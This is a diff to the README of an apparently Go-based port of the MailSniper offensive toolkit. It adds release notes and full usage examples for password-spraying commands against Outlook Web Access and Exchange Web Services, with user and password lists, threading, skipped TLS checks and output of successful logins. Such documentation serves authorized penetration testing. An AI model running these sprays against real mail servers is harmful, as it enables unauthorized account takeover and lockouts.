@@ -8,6 +8,14 @@ Single self-contained binary. No PowerShell. No dependencies to install. Runs on
 
 ## Release Notes
 
+### v1.1.0
+
+- `open-inbox` bug fix: correctly parses EWS XML `ResponseCode` (namespace-aware) instead of relying on HTTP status — no longer falsely reports all mailboxes as accessible
+- `spray-owa` and `spray-ews` now accept `--username` (single) or `--user-list` (file) for users
+- `spray-owa` and `spray-ews` now accept `--password` (single) or `--password-list` (file) for passwords
+- `spray-owa` and `spray-ews` now accept `--domain` to automatically prepend `DOMAIN\` to plain usernames
+- `spray-owa` and `spray-ews` now accept `--verbose` to print per-attempt progress (silent by default)
+
 ### v1.0.0
 
 - Full port of all MailSniper PowerShell modules to Go
@@ -170,36 +178,83 @@ All `self-search` flags also apply.
 ### `spray-owa` — Password spray against OWA
 
 ```bash
+# Single user, single password
+./mailsniper spray-owa \
+  --hostname mail.domain.com \
+  --username "DOMAIN\user" \
+  --password Summer2025 \
+  --skip-tls
+
+# User list, password list, with domain auto-prefix
 ./mailsniper spray-owa \
   --hostname mail.domain.com \
   --user-list users.txt \
-  --password Summer2025 \
+  --password-list wordlist.txt \
+  --domain DOMAIN \
   --threads 5 \
   --delay 500 \
-  --output hits.txt
+  --output hits.txt \
+  --verbose
 ```
 
 | Flag | Description | Default |
 |---|---|---|
-| `--user-list` | File of usernames (one per line) | required |
-| `--password` | Password to spray | required |
+| `--hostname` | OWA server hostname | required |
+| `--username` | Single username to spray | |
+| `--user-list` | File of usernames, one per line | |
+| `--password` | Single password to spray | |
+| `--password-list` | File of passwords, one per line | |
+| `--domain` | Prepend `DOMAIN\` to usernames that lack a domain prefix | |
 | `--threads` | Concurrent threads | `5` |
 | `--delay` | Delay between requests per thread (ms) | `0` |
+| `--output` | Output file path | |
+| `--output-format` | `csv`, `json`, or `txt` | `txt` |
+| `--skip-tls` | Skip TLS certificate verification | `false` |
+| `--verbose` | Print each password attempt and errors | `false` |
+
+> Either `--username` or `--user-list` is required. Either `--password` or `--password-list` is required.
 
 ---
 
 ### `spray-ews` — Password spray against EWS
 
 ```bash
+# Single user, single password
+./mailsniper spray-ews \
+  --hostname mail.domain.com \
+  --username "DOMAIN\user" \
+  --password Summer2025 \
+  --skip-tls
+
+# User list, password list, with domain auto-prefix
 ./mailsniper spray-ews \
   --hostname mail.domain.com \
   --user-list users.txt \
-  --password Summer2025 \
+  --password-list wordlist.txt \
+  --domain DOMAIN \
   --threads 5 \
-  --output hits.txt
+  --output hits.txt \
+  --verbose
 ```
 
-Same flags as `spray-owa` plus `--exchange-version`.
+| Flag | Description | Default |
+|---|---|---|
+| `--hostname` | Exchange server hostname | |
+| `--ews-url` | Full EWS URL (overrides `--hostname`) | |
+| `--username` | Single username to spray | |
+| `--user-list` | File of usernames, one per line | |
+| `--password` | Single password to spray | |
+| `--password-list` | File of passwords, one per line | |
+| `--domain` | Prepend `DOMAIN\` to usernames that lack a domain prefix | |
+| `--exchange-version` | Exchange version string | `Exchange2010` |
+| `--threads` | Concurrent threads | `5` |
+| `--delay` | Delay between requests per thread (ms) | `0` |
+| `--output` | Output file path | |
+| `--output-format` | `csv`, `json`, or `txt` | `txt` |
+| `--skip-tls` | Skip TLS certificate verification | `false` |
+| `--verbose` | Print each password attempt | `false` |
+
+> Either `--username` or `--user-list` is required. Either `--password` or `--password-list` is required.
 
 ---
 
